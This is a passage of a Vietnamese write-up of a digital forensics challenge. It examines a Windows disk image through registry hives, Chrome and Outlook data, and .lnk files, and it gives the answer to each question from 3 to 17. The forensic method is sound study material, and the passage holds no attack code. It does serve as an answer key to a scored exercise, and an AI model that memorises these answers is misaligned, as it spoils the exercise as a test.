![image](https://hackmd.io/_uploads/BJ_odKEbbl.png)
- Dùng tool Registry Explorer để xem hive vừa export, ở phần `CurrentBuild` hay `CurrentBuildNumber` trong `Microsoft\Windows NT\CurrentVersion`:
![image](https://hackmd.io/_uploads/Sy5NttEW-e.png)
**$\rightarrow$ Đáp án cần điền là `16299`.**

#### 3. What is the hostname of the computer?
Tiếp tục export `SYSTEM` và xem nó. Ở phần `ControlSet001\Control\ComputerName\ComputerName`:
![image](https://hackmd.io/_uploads/By4ToYEZWg.png)
**$\rightarrow$ Đáp án cần điền là `TOTALLYNOTAHACK`.**

#### 4. A messaging application was used to communicate with a fellow Alpaca enthusiest. What is the name of the software?
- Vào phần `Microsoft\Windows\CurrentVersion\App Management\System Program` để xem các app, ta thấy `cchat.exe` có vẻ khả nghi:
![image](https://hackmd.io/_uploads/BJ93kq4ZZl.png)
Nhưng nó không đúng .-.
- Vào phần `Microsoft\Windows\CurrentVersion\App Paths` để xem các app đã install:
![image](https://hackmd.io/_uploads/HJLNlqEZbx.png)
- Tra thử tên các app trên Google, đến `Lync`:
![image](https://hackmd.io/_uploads/SJnDlc4--l.png)
**$\rightarrow$ Đáp án cần điền là `Skype`.**

#### 5. What is the zip code of the administrator's post?
- Chrome lưu trữ dữ liệu ở `C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default`. Để tìm zip code of the administrator's post, ta vào `Web Data` và export nó ra:
![image](https://hackmd.io/_uploads/Byb1FABb-x.png)
- Dùng tool **DB Browser for SQLite** để mở file vừa export:
![image](https://hackmd.io/_uploads/H1K7KCBWZx.png)
- Chuột phải vào `autofill` và chọn `Browse Table`:
![image](https://hackmd.io/_uploads/SyguKArb-g.png)
**$\rightarrow$ Đáp án cần điền là `19709`.**

#### 6. What are the initials of the person who contacted the admin user from TAAUSAI?
- Tìm và export file `.ost` để xem tin nhắn Outlook. File nằm ở `[root]\Users\Karen\AppData\Local\Microsoft\Outlook\`:
![image](https://hackmd.io/_uploads/rk8yL1LZ-l.png)
- Dùng tool **Kernel OST Viewer** để mở và phân tích file trên:
![image](https://hackmd.io/_uploads/r1gLIkLWZl.png)
- Ở bên trái, chỉ có các phần in đậm là xem được, ta kiểm tra dần các mục đó. Ở tin nhắn thứ tư trong `Inbox`:
![image](https://hackmd.io/_uploads/rysjIJ8-Zg.png)
**$\rightarrow$ Đáp án cần điền là `MS`.**

#### 7. How much money was TAAUSAI willing to pay upfront?
- Ở tin nhắn thứ tư trong `Inbox`, Micheal Scotch bảo rằng:
![image](https://hackmd.io/_uploads/S1BEdJUZWg.png)
- Tiếp tục kiểm tra các thư tiếp theo:
![image](https://hackmd.io/_uploads/S1rttjUbbg.png)
**$\rightarrow$ Đáp án cần điền là `150000`.**

#### 8. What country is the admin user meeting the hacker group in?
- Tiếp tục kiểm tra các thư tiếp theo, ta thấy có lời mời hẹn gặp và địa điểm:
![image](https://hackmd.io/_uploads/S10Hns8ZZl.png)
- Tìm kiếm vị trí dựa trên toạ độ đó:
![image](https://hackmd.io/_uploads/BJoRhoUbWl.png)
**$\rightarrow$ Đáp án cần điền là `Egypt`.**

#### 9. What is the machine's timezone?
> *Use the three-letter abbreviation*

Ở phần United States holidays, bấm vào một cái bất kỳ:
![image](https://hackmd.io/_uploads/BJiP6i8bZl.png)
**$\rightarrow$ Đáp án cần điền là `UTC`.**

#### 10. When was `AlpacaCare.docx` last accessed?
Tìm trên phân vùng 2 không thấy nên ta tìm trong phân vùng 3. Ở `[root]`, phần `Date Accessed`:
![image](https://hackmd.io/_uploads/B1RVv38Wbe.png)
**$\rightarrow$ Đáp án cần điền là `2019-03-17 21:52`.**

#### 11. There was a second partition on the drive. What is the letter assigned to it?
- Để xem second partition trên ổ đĩa, ta tìm file `.lnk` ở trong `/[root]/Users/Karen/AppData/Roaming/Microsoft/Office/Recent/` và export các file đó ra ngoài để phân tích:
![image](https://hackmd.io/_uploads/HkfCKNWXbx.png)
- Mình đã tải tool **LECmd** của Eric Zimmerman để phân tích file `lnk` nhưng không dùng tới vì biểu tượng và tên của các file vừa trích xuất đã chứa đáp án:
![image](https://hackmd.io/_uploads/rknO5NZm-l.png)
**$\rightarrow$ Đáp án cần điền là `A`.**

#### 12. What is the answer to the question Company's manager asked Karen?
- Lục tìm trong phần `Inbox` có một email có nội dung là:
![image](https://hackmd.io/_uploads/ByW1hVbQWl.png)
- Ở email tiếp theo là trả lời từ Michael bảo rằng đáp án chính xác, kéo xuống dưới ta thấy thư trả lời của Karen:
![image](https://hackmd.io/_uploads/S10u34WX-e.png)
![image](https://hackmd.io/_uploads/SyNq2EWXbg.png)
**$\rightarrow$ Đáp án cần điền là `TheCardCriesNoMore`.**

#### 13. What is the job position offered to Karen?
> *3 words, 2 spaces in between*

Trong thư phản hồi để bảo rằng đáp án của Karen là chính xác từ Michael:
![image](https://hackmd.io/_uploads/S1CXp4ZQbg.png)
**$\rightarrow$ Đáp án cần điền là `cyber security analyst`.**

#### 14. When was the admin user password last changed?
- Export `SAM` registry hive và dùng **Registry Explorer** để phân tích.
- SAM hive chứa thông tin user account, thông tin đăng nhập và thông tin nhóm. Các thông tin này chủ yếu nằm ở `SAM\Domains\Account\Users`. Ở mục `Last password change` của group `Administrators`:
![image](https://hackmd.io/_uploads/BJxb-rZm-g.png)
**$\rightarrow$ Đáp án cần điền là `03/21/2019 19:13:09`.**

#### 15. What version of Chrome is installed on the machine?
Chrome lưu trữ dữ liệu (mật khẩu đã lưu, cookies và nhiều thông tin hữu ích khác) ở `/[root]/Users/Karen/AppData/Local/Google/Chrome/User Data/`. Nhấn vào `User Data` và lướt xuống dưới phần `File List` có file `Last Version`. Bấm vào file đó:
![image](https://hackmd.io/_uploads/rk33fH-XZe.png)
**$\rightarrow$ Đáp án cần điền là `72.0.3626.121`.**

#### 16. What is the URL used to download Skype?
- Thử tìm trong SOFTWARE, `Microsoft\Windows\CurrentVersion\App Paths` và tìm đến `Lync.exe`:
![image](https://hackmd.io/_uploads/SJbSBB-7bg.png)
- Có vẻ không đúng, ta thấy ở Partition 3 có `Skype-8.41.0.54.exe`. Bấm vào đó có file `Zone.Identifier`:
![image](https://hackmd.io/_uploads/r1UwvBW7bl.png)
**$\rightarrow$ Đáp án cần điền là `https://download.skype.com/s4l/download/win/Skype-8.41.0.54.exe`.**

#### 17. What is the domain name of the website Karen browsed on Alpaca care that the file `AlpacaCare.docx` is based on?
- Trong phân vùng 3, ở `[root]`, phần `Date Accessed`, export file `AlpacaCare.docx` và mở nó:
![image](https://hackmd.io/_uploads/HJRJ5BbX-e.png)
- Dùng `Ctrl` và click vào `Home`:
![image](https://hackmd.io/_uploads/rkP-5BWmZl.png)
**$\rightarrow$ Đáp án cần điền là `palominoalpacafarm.com`.**
